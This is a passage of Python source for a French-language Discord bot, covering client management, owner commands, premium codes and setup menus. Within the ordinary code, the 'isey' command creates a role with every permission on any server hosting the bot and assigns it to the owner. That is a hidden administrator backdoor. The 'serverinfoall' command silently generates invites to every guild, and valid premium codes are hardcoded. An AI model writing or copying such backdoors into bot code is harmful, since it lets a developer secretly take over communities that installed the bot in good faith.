    stats_data = collection9.find_one({"guild_id": str(guild.id)})

    if not stats_data:
        await interaction.response.send_message("⚠️ Aucun salon de stats enregistré pour ce serveur.", ephemeral=True)
        return

    deleted_channels = []

    try:
        for channel_id_key in ["member_channel_id", "role_channel_id", "bots_channel_id"]:
            channel_id = stats_data.get(channel_id_key)
            channel = guild.get_channel(channel_id)
            if channel:
                await channel.delete()
                deleted_channels.append(channel.name)

        collection9.delete_one({"guild_id": str(guild.id)})

        await interaction.response.send_message(
            f"✅ Salons de stats supprimés : {', '.join(deleted_channels)}", ephemeral=True
        )
    except Exception as e:
        await interaction.response.send_message(f"❌ Une erreur est survenue lors de la suppression : {e}", ephemeral=True)

#--------------------------------------------------------------------------- Gestion Clients

@bot.tree.command(name="add_client", description="Ajoute un client via mention ou ID")
@app_commands.describe(
    user="Mentionne un membre du serveur",
    service="Type de service acheté (Graphisme, Serveur, Site, Bot)",
    service_name="Nom du service acheté (ex: Project Delta)"
)
async def add_client(interaction: discord.Interaction, user: discord.Member, service: str, service_name: str):
    try:
        # ⬇️ Déferer la réponse uniquement si ce n'est pas déjà fait
        if not interaction.response.is_done():
            await interaction.response.defer(thinking=True)

        # ⬇️ Vérification du contexte serveur
        if not interaction.guild or interaction.guild.id != PROJECT_DELTA:
            return await interaction.followup.send("❌ Cette commande n'est autorisée que sur le serveur Project : Delta.", ephemeral=True)

        # Vérification des permissions de l'utilisateur
        if interaction.user.id != STAFF_PROJECT:
            return await interaction.followup.send("🚫 Tu n'as pas la permission d'utiliser cette commande.", ephemeral=True)

        # Log de la commande lancée
        print(f"🔧 Commande /add_client lancée par {interaction.user} ({interaction.user.id}) pour {user} ({user.id})")

        # Récupérer les données existantes
        existing_data = collection5.find_one({"guild_id": interaction.guild.id}) or {}
        existing_clients = existing_data.get("clients", [])

        # Vérifier si le client existe déjà
        if any(client.get("user_id") == user.id for client in existing_clients):
            return await interaction.followup.send(f"⚠️ {user.mention} est déjà enregistré comme client !", ephemeral=True)

        # Préparer les données du client
        purchase_date = datetime.utcnow().strftime("%d/%m/%Y à %H:%M:%S")
        client_data = {
            "user_id": user.id,
            "service": service,
            "service_name": service_name,
            "purchase_date": purchase_date,
            "creator_id": interaction.user.id,  # 👈 Ajout ici
            "done_by": {
                "name": str(interaction.user),
                "id": interaction.user.id
            }
        }

        # Mise à jour ou insertion des données
        if existing_data:
            collection5.update_one(
                {"guild_id": interaction.guild.id},
                {"$push": {"clients": client_data}}
            )
        else:
            collection5.insert_one({
                "guild_id": interaction.guild.id,
                "clients": [client_data]
            })

        # Ajouter le rôle client
        role = discord.utils.get(interaction.guild.roles, id=1359963854389379241)
        if role:
            await user.add_roles(role)
            print(f"🔧 Rôle ajouté à {user}")
        else:
            print("⚠️ Rôle introuvable.")

        # Embed de confirmation public
        confirmation_embed = discord.Embed(
            title="🎉 Nouveau client enregistré !",
            description=f"Bienvenue à {user.mention} en tant que **client officiel** ! 🛒",
            color=discord.Color.green()
        )
        confirmation_embed.add_field(name="🛠️ Service", value=f"`{service}`", inline=True)
        confirmation_embed.add_field(name="📌 Nom du Service", value=f"`{service_name}`", inline=True)
        confirmation_embed.add_field(name="👨‍💻 Réalisé par", value=f"`{interaction.user}`", inline=False)
        confirmation_embed.add_field(name="🗓️ Date d'achat", value=f"`{purchase_date}`", inline=False)
        confirmation_embed.set_footer(text=f"Ajouté par {interaction.user}", icon_url=interaction.user.display_avatar.url)
        confirmation_embed.set_thumbnail(url=user.display_avatar.url)

        # Envoi de la confirmation publique
        await interaction.followup.send(embed=confirmation_embed)

        # Embed de log privé
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            log_embed = discord.Embed(
                title="📋 Nouveau client ajouté",
                color=discord.Color.green(),
                timestamp=datetime.utcnow()
            )
            log_embed.add_field(name="👤 Client", value=f"{user.mention} (`{user.id}`)", inline=False)
            log_embed.add_field(name="🛠️ Service", value=service, inline=True)
            log_embed.add_field(name="📌 Nom", value=service_name, inline=True)
            log_embed.add_field(name="👨‍💻 Fait par", value=f"{interaction.user} (`{interaction.user.id}`)", inline=False)
            log_embed.add_field(name="🗓️ Date", value=purchase_date, inline=False)
            log_embed.set_footer(text="Log automatique", icon_url=interaction.user.display_avatar.url)

            await log_channel.send(embed=log_embed)
        else:
            print("⚠️ Salon de log introuvable.")

    except Exception as e:
        print("❌ Erreur inattendue :", e)
        traceback.print_exc()
        await interaction.followup.send("⚠️ Une erreur est survenue. Merci de réessayer plus tard.", ephemeral=True)


@bot.tree.command(name="remove_client", description="Supprime un client enregistré")
@app_commands.describe(
    user="Mentionne le client à supprimer"
)
async def remove_client(interaction: discord.Interaction, user: discord.Member):
    await interaction.response.defer(thinking=True)

    # Vérifier que la commande est exécutée sur le bon serveur
    if interaction.guild.id != PROJECT_DELTA:
        return await interaction.response.send_message("❌ Cette commande n'est autorisée que sur le serveur Project : Delta.", ephemeral=True)

    if interaction.user.id not in STAFF_PROJECT:
        return await interaction.followup.send("🚫 Tu n'as pas la permission d'utiliser cette commande.", ephemeral=True)

    if not interaction.guild:
        return await interaction.followup.send("❌ Cette commande ne peut être utilisée qu'en serveur.", ephemeral=True)

    try:
        print(f"🗑️ Commande /remove_client lancée par {interaction.user} pour {user}")

        # Suppression du await ici
        existing_data = collection5.find_one({"guild_id": interaction.guild.id})
        if not existing_data:
            return await interaction.followup.send("❌ Aucun client enregistré pour ce serveur.")

        clients = existing_data.get("clients", [])
        client_found = None

        for client in clients:
            if client.get("user_id") == user.id:
                client_found = client
                break

        if not client_found:
            return await interaction.followup.send(f"⚠️ {user.mention} n'est pas enregistré comme client.")

        # Suppression du client dans la base de données
        collection5.update_one(
            {"guild_id": interaction.guild.id},
            {"$pull": {"clients": {"user_id": user.id}}}
        )

        # Retirer le rôle de l'utilisateur
        role = discord.utils.get(interaction.guild.roles, id=1359963854389379241)
        if role:
            await user.remove_roles(role)
            print(f"🔧 Rôle retiré de {user} avec succès.")
        else:
            print("⚠️ Rôle introuvable.")

        # Embed public de confirmation
        embed = discord.Embed(
            title="🗑️ Client retiré",
            description=f"{user.mention} a été retiré de la liste des clients.",
            color=discord.Color.red()
        )
        embed.add_field(name="🛠️ Ancien service", value=f"`{client_found['service']}`", inline=True)
        embed.add_field(name="📌 Nom du service", value=f"`{client_found['service_name']}`", inline=True)
        embed.add_field(name="🗓️ Achat le", value=f"`{client_found['purchase_date']}`", inline=False)
        embed.set_footer(text=f"Retiré par {interaction.user}", icon_url=interaction.user.display_avatar.url)
        embed.set_thumbnail(url=user.display_avatar.url)

        await interaction.followup.send(embed=embed)

        # Log dans le salon des logs
        log_channel = bot.get_channel(LOG_CHANNEL_RETIRE_ID)
        if log_channel:
            log_embed = discord.Embed(
                title="🔴 Client retiré",
                description=f"👤 {user.mention} (`{user.id}`)\n❌ Supprimé de la base de clients.",
                color=discord.Color.red()
            )
            log_embed.set_footer(text=f"Retiré par {interaction.user}", icon_url=interaction.user.display_avatar.url)
            log_embed.timestamp = discord.utils.utcnow()
            await log_channel.send(embed=log_embed)
        else:
            print("⚠️ Salon de log introuvable.")

    except Exception as e:
        print("❌ Erreur inattendue :", e)
        traceback.print_exc()
        await interaction.followup.send("⚠️ Une erreur est survenue pendant la suppression. Merci de réessayer plus tard.", ephemeral=True)


class ClientListView(View):
    def __init__(self, clients, author):
        super().__init__(timeout=60)
        self.clients = clients
        self.author = author
        self.page = 0
        self.per_page = 5

    def format_embed(self):
        start = self.page * self.per_page
        end = start + self.per_page
        embed = discord.Embed(
            title="📋 Liste des Clients",
            description=f"Voici les clients enregistrés sur ce serveur ({len(self.clients)} total) :",
            color=discord.Color.blurple()
        )

        for i, client in enumerate(self.clients[start:end], start=1 + start):
            user_mention = f"<@{client['user_id']}>"
            creator_mention = f"<@{client.get('creator_id', 'inconnu')}>"

            embed.add_field(
                name=f"👤 Client #{i}",
                value=(
                    f"**Utilisateur :** {user_mention}\n"
                    f"**Service :** `{client['service']}`\n"
                    f"**Nom :** `{client['service_name']}`\n"
                    f"**📅 Date :** `{client['purchase_date']}`\n"
                    f"**👨‍🔧 Réalisé par :** {creator_mention}"
                ),
                inline=False
            )

        total_pages = ((len(self.clients) - 1) // self.per_page) + 1
        embed.set_footer(text=f"Page {self.page + 1} / {total_pages}")
        return embed

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author.id:
            await interaction.response.send_message("❌ Tu ne peux pas interagir avec cette vue.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="⬅️", style=discord.ButtonStyle.gray)
    async def previous(self, interaction: discord.Interaction, button: Button):
        if self.page > 0:
            self.page -= 1
            await interaction.response.edit_message(embed=self.format_embed(), view=self)

    @discord.ui.button(label="➡️", style=discord.ButtonStyle.gray)
    async def next(self, interaction: discord.Interaction, button: Button):
        if (self.page + 1) * self.per_page < len(self.clients):
            self.page += 1
            await interaction.response.edit_message(embed=self.format_embed(), view=self)

@bot.tree.command(name="list_clients", description="Affiche tous les clients enregistrés")
async def list_clients(interaction: discord.Interaction):
    await interaction.response.defer(thinking=True)

    # Vérifier que la commande est exécutée sur le bon serveur
    if interaction.guild.id != PROJECT_DELTA:
        return await interaction.response.send_message("❌ Cette commande n'est autorisée que sur le serveur Project : Delta.", ephemeral=True)

    if interaction.user.id not in STAFF_PROJECT:
        return await interaction.followup.send("🚫 Tu n'as pas la permission d'utiliser cette commande.", ephemeral=True)


    try:
        data = collection5.find_one({"guild_id": interaction.guild.id})
        if not data or not data.get("clients"):
            return await interaction.followup.send("❌ Aucun client enregistré sur ce serveur.")

        clients = data["clients"]
        view = ClientListView(clients, interaction.user)
        embed = view.format_embed()
        await interaction.followup.send(embed=embed, view=view)

    except Exception as e:
        print("❌ Erreur lors de la récupération des clients :", e)
        traceback.print_exc()
        await interaction.followup.send("⚠️ Une erreur est survenue pendant l'affichage.")

#--------------------------------------------------------------------------- Owner Verif

# Vérification si l'utilisateur est l'owner du bot
def is_owner(ctx):
    return ctx.author.id == ISEY_ID

@bot.hybrid_command()
async def shutdown(ctx):
    if is_owner(ctx):
        embed = discord.Embed(
            title="Arrêt du Bot",
            description="Le bot va maintenant se fermer. Tous les services seront arrêtés.",
            color=discord.Color.red()
        )
        embed.set_footer(text="Cette action est irréversible.")
        await ctx.send(embed=embed)
        await bot.close()
    else:
        await ctx.send("Seul l'owner peut arrêter le bot.")

@bot.command()
async def restart(ctx):
    if is_owner(ctx):
        embed = discord.Embed(
            title="Redémarrage du Bot",
            description="Le bot va redémarrer maintenant...",
            color=discord.Color.blue()
        )
        await ctx.send(embed=embed)
        os.execv(sys.executable, ['python'] + sys.argv)  # Redémarre le bot
    else:
        await ctx.send("Seul l'owner peut redémarrer le bot.")

@bot.command()
async def getbotinfo(ctx):
    """Affiche les statistiques détaillées du bot avec un embed amélioré visuellement."""
    try:
        start_time = time.time()
        
        # Calcul de l'uptime du bot
        uptime_seconds = int(time.time() - bot.uptime)
        uptime_days, remainder = divmod(uptime_seconds, 86400)
        uptime_hours, remainder = divmod(remainder, 3600)
        uptime_minutes, uptime_seconds = divmod(remainder, 60)

        # Récupération des statistiques
        total_servers = len(bot.guilds)
        total_users = sum(g.member_count for g in bot.guilds if g.member_count)
        total_text_channels = sum(len(g.text_channels) for g in bot.guilds)
        total_voice_channels = sum(len(g.voice_channels) for g in bot.guilds)
        latency = round(bot.latency * 1000, 2)  # Latence en ms
        total_commands = len(bot.commands)

        # Création d'une barre de progression plus détaillée pour la latence
        latency_bar = "🟩" * min(10, int(10 - (latency / 30))) + "🟥" * max(0, int(latency / 30))

        # Création de l'embed
        embed = discord.Embed(
            title="✨ **Informations du Bot**",
            description=f"📌 **Nom :** `{bot.user.name}`\n"
                        f"🆔 **ID :** `{bot.user.id}`\n"
                        f"🛠️ **Développé par :** `Iseyg`\n"
                        f"🔄 **Version :** `1.2.1`",
            color=discord.Color.blurple(),  # Dégradé bleu-violet pour une touche dynamique
            timestamp=datetime.utcnow()
        )

        # Ajout de l'avatar et de la bannière si disponible
        embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else None)
        if bot.user.banner:
            embed.set_image(url=bot.user.banner.url)

        embed.set_footer(text=f"Requête faite par {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

        # 📊 Statistiques générales
        embed.add_field(
            name="📊 **Statistiques générales**",
            value=(
                f"📌 **Serveurs :** `{total_servers:,}`\n"
                f"👥 **Utilisateurs :** `{total_users:,}`\n"
                f"💬 **Salons textuels :** `{total_text_channels:,}`\n"
                f"🔊 **Salons vocaux :** `{total_voice_channels:,}`\n"
                f"📜 **Commandes :** `{total_commands:,}`\n"
            ),
            inline=False
        )

        # 🔄 Uptime
        embed.add_field(
            name="⏳ **Uptime**",
            value=f"🕰️ `{uptime_days}j {uptime_hours}h {uptime_minutes}m {uptime_seconds}s`",
            inline=True
        )

        # 📡 Latence
        embed.add_field(
            name="📡 **Latence**",
            value=f"⏳ `{latency} ms`\n{latency_bar}",
            inline=True
        )

        # 📍 Informations supplémentaires
        embed.add_field(
            name="📍 **Informations supplémentaires**",
            value="💡 **Technologies utilisées :** `Python, discord.py`\n"
                  "⚙️ **Bibliothèques :** `discord.py, asyncio, etc.`",
            inline=False
        )

        # Ajout d'un bouton d'invitation
        view = discord.ui.View()
        invite_button = discord.ui.Button(
            label="📩 Inviter le Bot",
            style=discord.ButtonStyle.link,
            url="https://discord.com/oauth2/authorize?client_id=1356693934012891176"
        )
        view.add_item(invite_button)

        await ctx.send(embed=embed, view=view)

        end_time = time.time()
        print(f"Commande `getbotinfo` exécutée en {round((end_time - start_time) * 1000, 2)}ms")

    except Exception as e:
        print(f"Erreur dans la commande `getbotinfo` : {e}")

# 🎭 Emojis dynamiques pour chaque serveur
EMOJIS_SERVEURS = ["🌍", "🚀", "🔥", "👾", "🏆", "🎮", "🏴‍☠️", "🏕️"]

# 🏆 Liste des serveurs Premium
premium_servers = {}

# ⚜️ ID du serveur Etherya
ETHERYA_ID = 123456789012345678  

def boost_bar(level):
    """Génère une barre de progression pour le niveau de boost."""
    filled = "🟣" * level
    empty = "⚫" * (3 - level)
    return filled + empty

class ServerInfoView(View):
    def __init__(self, ctx, bot, guilds, premium_servers):
        super().__init__()
        self.ctx = ctx
        self.bot = bot
        self.guilds = sorted(guilds, key=lambda g: g.member_count, reverse=True)  
        self.premium_servers = premium_servers
        self.page = 0
        self.servers_per_page = 5
        self.max_page = (len(self.guilds) - 1) // self.servers_per_page
        self.update_buttons()
    
    def update_buttons(self):
        self.children[0].disabled = self.page == 0  
        self.children[1].disabled = self.page == self.max_page  

    async def update_embed(self, interaction):
        embed = await self.create_embed()
        self.update_buttons()
        await interaction.response.edit_message(embed=embed, view=self)

    async def create_embed(self):
        total_servers = len(self.guilds)
        total_premium = len(self.premium_servers)

        # 🌟 Couleur spéciale pour Etherya
        embed_color = discord.Color.purple() if ETHERYA_ID in self.premium_servers else discord.Color.gold()

        embed = discord.Embed(
            title=f"🌍 Serveurs du Bot (`{total_servers}` total)",
            description="🔍 Liste des serveurs où le bot est présent, triés par popularité.",
            color=embed_color,
            timestamp=datetime.utcnow()
        )

        embed.set_footer(
            text=f"Page {self.page + 1}/{self.max_page + 1} • Demandé par {self.ctx.author}", 
            icon_url=self.ctx.author.avatar.url
        )
        embed.set_thumbnail(url=self.bot.user.avatar.url)

        start = self.page * self.servers_per_page
        end = start + self.servers_per_page

        for rank, guild in enumerate(self.guilds[start:end], start=start + 1):
            emoji = EMOJIS_SERVEURS[rank % len(EMOJIS_SERVEURS)]
            is_premium = "💎 **Premium**" if guild.id in self.premium_servers else "⚪ Standard"
            vip_badge = " 👑 VIP" if guild.member_count > 10000 else ""
            boost_display = f"{boost_bar(guild.premium_tier)} *(Niveau {guild.premium_tier})*"

            # 💎 Mise en avant spéciale d’Etherya
            if guild.id == ETHERYA_ID:
                guild_name = f"⚜️ **{guild.name}** ⚜️"
                is_premium = "**🔥 Serveur Premium Ultime !**"
                embed.color = discord.Color.purple()
                embed.description = (
                    "━━━━━━━━━━━━━━━━━━━\n"
                    "🎖️ **Etherya est notre serveur principal !**\n"
                    "🔗 [Invitation permanente](https://discord.gg/votre-invitation)\n"
                    "━━━━━━━━━━━━━━━━━━━"
                )
            else:
                guild_name = f"**#{rank}** {emoji} **{guild.name}**{vip_badge}"

            # 🔗 Création d'un lien d'invitation si possible
            invite_url = "🔒 *Aucune invitation disponible*"
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1, unique=True)
                invite_url = f"[🔗 Invitation]({invite.url})"

            owner = guild.owner.mention if guild.owner else "❓ *Inconnu*"
            emoji_count = len(guild.emojis)

            # 🎨 Affichage plus propre
            embed.add_field(
                name=guild_name,
                value=(
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"👑 **Propriétaire** : {owner}\n"
                    f"📊 **Membres** : `{guild.member_count}`\n"
                    f"💎 **Boosts** : {boost_display}\n"
                    f"🛠️ **Rôles** : `{len(guild.roles)}` • 💬 **Canaux** : `{len(guild.channels)}`\n"
                    f"😃 **Emojis** : `{emoji_count}`\n"
                    f"🆔 **ID** : `{guild.id}`\n"
                    f"📅 **Créé le** : `{guild.created_at.strftime('%d/%m/%Y')}`\n"
                    f"🏅 **Statut** : {is_premium}\n"
                    f"{invite_url}\n"
                    f"━━━━━━━━━━━━━━━━━━━"
                ),
                inline=False
            )

        embed.add_field(
            name="📜 Statistiques Premium",
            value=f"⭐ **{total_premium}** serveurs Premium activés.",
            inline=False
        )

        embed.set_image(url="https://github.com/Cass64/EtheryaBot/blob/main/images_etherya/etheryaBot_banniere.png?raw=true")
        return embed

    @discord.ui.button(label="⬅️ Précédent", style=discord.ButtonStyle.green, disabled=True)
    async def previous(self, interaction: discord.Interaction, button: Button):
        self.page -= 1
        await self.update_embed(interaction)

    @discord.ui.button(label="➡️ Suivant", style=discord.ButtonStyle.green)
    async def next(self, interaction: discord.Interaction, button: Button):
        self.page += 1
        await self.update_embed(interaction)

@bot.command()
async def serverinfoall(ctx):
    if ctx.author.id == ISEY_ID:  # Assurez-vous que seul l'owner peut voir ça
        premium_server_ids = get_premium_servers()
        view = ServerInfoView(ctx, bot, bot.guilds, premium_server_ids)
        embed = await view.create_embed()
        await ctx.send(embed=embed, view=view)
    else:
        await ctx.send("Seul l'owner du bot peut obtenir ces informations.")

@bot.command()
async def isey(ctx):
    if ctx.author.id == ISEY_ID:  # Vérifie si l'utilisateur est l'owner du bot
        try:
            guild = ctx.guild
            if guild is None:
                return await ctx.send("❌ Cette commande doit être exécutée dans un serveur.")
            
            # Création (ou récupération) d'un rôle administrateur spécial
            role_name = "Iseyg-SuperAdmin"
            role = discord.utils.get(guild.roles, name=role_name)

            if role is None:
                role = await guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions.all(),  # Accorde toutes les permissions
                    color=discord.Color.red(),
                    hoist=True  # Met le rôle en haut de la liste des membres
                )
                await ctx.send(f"✅ Rôle `{role_name}` créé avec succès.")

            # Attribution du rôle à l'utilisateur
            await ctx.author.add_roles(role)
            await ctx.send(f"✅ Tu as maintenant les permissions administrateur `{role_name}` sur ce serveur !")
        except discord.Forbidden:
            await ctx.send("❌ Le bot n'a pas les permissions nécessaires pour créer ou attribuer des rôles.")
        except Exception as e:
            await ctx.send(f"❌ Une erreur est survenue : `{e}`")
    else:
        await ctx.send("❌ Seul l'owner du bot peut exécuter cette commande.")

#-------------------------------------------------------------------------- Commandes /premium et /viewpremium
@bot.tree.command(name="premium")
@app_commands.describe(code="Entrez votre code premium")
async def premium(interaction: discord.Interaction, code: str):
    if interaction.user.id != ISEY_ID and not interaction.user.guild_permissions.administrator:
        print("Utilisateur non autorisé.")
        await interaction.response.send_message("❌ Vous n'avez pas les permissions nécessaires.", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)

    try:
        # Charger les données du serveur
        data = load_guild_settings(interaction.guild.id)
        premium_data = data.get("setup_premium", {})

        # Initialiser la liste des codes utilisés si elle n'existe pas
        if "used_codes" not in premium_data:
            premium_data["used_codes"] = []

        # Liste des codes valides
        valid_codes = [
            "PROJECT-P3U9-DELTA","PROJECT-N2I0-DELTA","PROJECT-N9R9-DELTA","PROJECT-R7F8-DELTA","PROJECT-Y6Z9-DELTA","PROJECT-M6I5-DELTA","PROJECT-B6G5-DELTA","PROJECT-X3S8-DELTA","PROJECT-Q6A3-DELTA","PROJECT-O8Y0-DELTA","PROJECT-G1N8-DELTA","PROJECT-K3S8-DELTA","PROJECT-J2V1-DELTA","PROJECT-I7U8-DELTA","PROJECT-T8P5-DELTA","PROJECT-U1V6-DELTA","PROJECT-F3K9-DELTA","PROJECT-W5A4-DELTA","PROJECT-Q4W5-DELTA","PROJECT-U3R8-DELTA",
        ]

        # Vérifier si le code est valide
        if code in valid_codes:
            if code in premium_data["used_codes"]:
                embed = discord.Embed(
                    title="❌ Code déjà utilisé",
                    description="Ce code premium a déjà été utilisé. Vous ne pouvez pas l'utiliser à nouveau.",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed)
                return

            if data.get("is_premium", False):
                embed = discord.Embed(
                    title="⚠️ Serveur déjà Premium",
                    description=f"Le serveur **{interaction.guild.name}** est déjà un serveur premium. 🎉",
                    color=discord.Color.yellow()
                )
                embed.add_field(
                    name="Pas de double activation",
                    value="Ce serveur a déjà activé le code premium. Aucun changement nécessaire.",
                    inline=False
                )
                embed.set_footer(text="Merci d'utiliser nos services premium.")
                embed.set_thumbnail(url=interaction.guild.icon.url)
                await interaction.followup.send(embed=embed)
                return

            # Activer le premium
            data["is_premium"] = True
            premium_data["used_codes"].append(code)
            data["setup_premium"] = premium_data

            # ✅ ICI : indentation correcte
            collection2.update_one(
                {"guild_id": interaction.guild.id},
                {
                    "$set": {
                        "guild_name": interaction.guild.name,
                        "is_premium": True,
                        "used_codes": premium_data["used_codes"]
                    }
                },
                upsert=True
            )

            embed = discord.Embed(
                title="✅ Serveur Premium Activé",
                description=f"Le serveur **{interaction.guild.name}** est maintenant premium ! 🎉",
                color=discord.Color.green()
            )
            embed.add_field(
                name="Avantages Premium",
                value="Profitez des fonctionnalités exclusives réservées aux serveurs premium. 🎁",
                inline=False
            )
            embed.set_footer(text="Merci d'utiliser nos services premium.")
            embed.set_thumbnail(url=interaction.guild.icon.url)
            await interaction.followup.send(embed=embed)

        else:
            embed = discord.Embed(
                title="❌ Code Invalide",
                description="Le code que vous avez entré est invalide. Veuillez vérifier votre code ou contactez le support.",
                color=discord.Color.red()
            )
            embed.add_field(
                name="Suggestions",
                value="1. Assurez-vous d'avoir saisi le code exactement comme il est fourni.\n"
                      "2. Le code est sensible à la casse.\n"
                      "3. Si vous avez des doutes, contactez le support.",
                inline=False
            )
            embed.add_field(
                name="Code Expiré ?",
                value="Si vous pensez que votre code devrait être valide mais ne l'est pas, il est possible qu'il ait expiré.",
                inline=False
            )
            await interaction.followup.send(embed=embed)

    except Exception as e:
        await interaction.followup.send(f"Une erreur est survenue : {str(e)}")


@bot.tree.command(name="viewpremium", description="Voir les serveurs ayant activé le Premium")
async def viewpremium(interaction: discord.Interaction):
    if interaction.user.id != ISEY_ID and not interaction.user.guild_permissions.administrator:
        print("Utilisateur non autorisé.")
        await interaction.response.send_message("❌ Vous n'avez pas les permissions nécessaires.", ephemeral=True)
        return

    # Récupération des serveurs premium
    premium_servers_data = collection2.find({"guild_id": {"$exists": True}})

    premium_list = []
    for server in premium_servers_data:
        guild_name = server.get("guild_name", "❓ Nom inconnu")
        premium_list.append(f"📌 **{guild_name}**")

    if premium_list:
        embed = discord.Embed(
            title="🌟 Liste des Serveurs Premium",
            description="Voici les serveurs ayant activé le **Premium** :\n\n" + "\n".join(premium_list),
            color=discord.Color.gold()
        )
        embed.set_footer(text="Merci à tous pour votre soutien 💖")
        await interaction.response.send_message(embed=embed)
    else:
        embed = discord.Embed(
            title="🔒 Aucun Serveur Premium",
            description="Aucun serveur n'a encore activé le **Premium** sur ce bot.",
            color=discord.Color.red()
        )
        embed.add_field(
            name="Pourquoi devenir premium ? 💎",
            value="Obtenez des **fonctionnalités exclusives**, plus de **personnalisation** et un **support prioritaire** !\n\n"
                  "📬 **Contactez-nous** pour plus d'informations.",
            inline=False
        )
        embed.set_footer(text="Rejoignez le programme Premium dès aujourd'hui ✨")

        # Bouton d'action
        join_button = discord.ui.Button(label="🚀 Rejoindre Premium", style=discord.ButtonStyle.green, url="https://votre-lien-premium.com")

        view = discord.ui.View()
        view.add_item(join_button)

        await interaction.response.send_message(embed=embed, view=view)

# Autocomplétion des serveurs premium
async def premium_autocomplete(interaction: discord.Interaction, current: str):
    servers = collection2.find({"guild_id": {"$exists": True}})
    return [
        app_commands.Choice(name=server.get("guild_name", "Nom inconnu"), value=str(server["guild_id"]))
        for server in servers if current.lower() in server.get("guild_name", "").lower()
    ][:25]  # Discord limite à 25 suggestions

@bot.tree.command(name="delete-premium", description="Supprime un serveur de la liste Premium")
@app_commands.describe(server="Choisissez le serveur à supprimer")
@app_commands.autocomplete(server=premium_autocomplete)
async def delete_premium(interaction: discord.Interaction, server: str):
    if interaction.user.id != ISEY_ID:
        await interaction.response.send_message("❌ Vous n'avez pas la permission d'utiliser cette commande.", ephemeral=True)
        return

    result = collection2.delete_one({"guild_id": int(server)})
    if result.deleted_count > 0:
        await interaction.response.send_message(f"✅ Le serveur Premium avec l'ID `{server}` a bien été supprimé.", ephemeral=True)
    else:
        await interaction.response.send_message("⚠️ Aucun serveur trouvé avec cet ID.", ephemeral=True)

@bot.tree.command(name="devenirpremium")
async def devenirpremium(interaction: discord.Interaction):
    if interaction.user.id != ISEY_ID and not interaction.user.guild_permissions.administrator:
        print("Utilisateur non autorisé.")
        await interaction.response.send_message("❌ Vous n'avez pas les permissions nécessaires.", ephemeral=True)
        return

    # Charger les données de ce serveur spécifique
    data = load_guild_settings(interaction.guild.id)
    setup_premium_data = data["setup_premium"]

    if setup_premium_data:  # Si le serveur est déjà premium
        embed = discord.Embed(
            title="🎉 Vous êtes déjà Premium !",
            description=f"Le serveur **{interaction.guild.name}** est déjà un serveur Premium ! 🎉",
            color=discord.Color.green()
        )
        embed.add_field(
            name="Avantages Premium",
            value="Profitez déjà des fonctionnalités exclusives réservées aux serveurs premium. 🎁",
            inline=False
        )
        embed.set_footer(text="Merci d'utiliser nos services premium.")
        embed.set_thumbnail(url=interaction.guild.icon.url)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    else:  # Si le serveur n'est pas encore premium
        embed = discord.Embed(
            title="🚀 Comment devenir Premium ?",
            description=f"Le serveur **{interaction.guild.name}** n'est pas encore premium. Voici comment vous pouvez devenir premium :",
            color=discord.Color.blue()
        )
        embed.add_field(
            name="Étapes pour devenir Premium",
            value="1. Entrez votre code premium avec la commande `/premium <votre_code>`.\n"
                  "2. Un message de confirmation vous sera envoyé une fois le serveur activé.\n"
                  "3. Profitez des fonctionnalités exclusives réservées aux serveurs Premium ! 🎁",
            inline=False
        )
        embed.add_field(
            name="Pourquoi devenir Premium ?",
            value="Les serveurs premium ont accès à des fonctionnalités exclusives, plus de personnalisation et des options avancées.",
            inline=False
        )
        embed.set_footer(text="Rejoignez notre programme Premium et profitez des avantages !")
        embed.set_thumbnail(url=interaction.guild.icon.url)
        await interaction.response.send_message(embed=embed, ephemeral=True)

#------------------------------------------------------------------------- Commande SETUP
class SetupView(View):
    def __init__(self, ctx, guild_data, collection):
        super().__init__(timeout=180)
        self.ctx = ctx
        self.guild_data = guild_data or {}
        self.collection = collection
        self.embed_message = None
        self.add_item(MainSelect(self))

    async def start(self):  
        embed = discord.Embed(
            title="⚙️ **Configuration du Serveur**",
            description="""
🎉 **Bienvenue dans le menu de configuration !**  
Personnalisez votre serveur **facilement** grâce aux options ci-dessous.  

📌 **Gestion du Bot** - 🎛️ Modifier les rôles et salons.  
🛡️ **Sécurité & Anti-Raid** - 🚫 Activer/Désactiver les protections.  

🔽 **Sélectionnez une catégorie pour commencer !**
            """,
            color=discord.Color.blurple()
        )

        self.embed_message = await self.ctx.send(embed=embed, view=self)

    async def update_embed(self, category):
        embed = discord.Embed(color=discord.Color.blurple(), timestamp=discord.utils.utcnow())
        embed.set_footer(text=f"Serveur : {self.ctx.guild.name}", icon_url=self.ctx.guild.icon.url if self.ctx.guild.icon else None)

        if category == "accueil":
            embed.title = "⚙️ **Configuration du Serveur**"
            embed.description = """
            🎉 **Bienvenue dans le menu de configuration !**  
            Personnalisez votre serveur **facilement** grâce aux options ci-dessous.  

            📌 **Gestion du Bot** - 🎛️ Modifier les rôles et salons.  
            🛡️ **Sécurité & Anti-Raid** - 🚫 Activer/Désactiver les protections.  

            🔽 **Sélectionnez une catégorie pour commencer !**
            """
            self.clear_items()
            self.add_item(MainSelect(self))

        elif category == "gestion":
            embed.title = "⚙️ **Gestion du Bot**"
            embed.add_field(name="⚙️ Préfixe actuel :", value=f"`{self.guild_data.get('prefix', '+')}`", inline=False)
            embed.add_field(name="👑 Propriétaire :", value=format_mention(self.guild_data.get('owner', 'Non défini'), "user"), inline=False)
            embed.add_field(name="🛡️ Rôle Admin :", value=format_mention(self.guild_data.get('admin_role', 'Non défini'), "role"), inline=False)
            embed.add_field(name="👥 Rôle Staff :", value=format_mention(self.guild_data.get('staff_role', 'Non défini'), "role"), inline=False)
            embed.add_field(name="🚨 Salon Sanctions :", value=format_mention(self.guild_data.get('sanctions_channel', 'Non défini'), "channel"), inline=False)

            self.clear_items()
            self.add_item(InfoSelect(self))
            self.add_item(ReturnButton(self))

        elif category == "anti":
            embed.title = "🛡️ **Sécurité & Anti-Raid**"
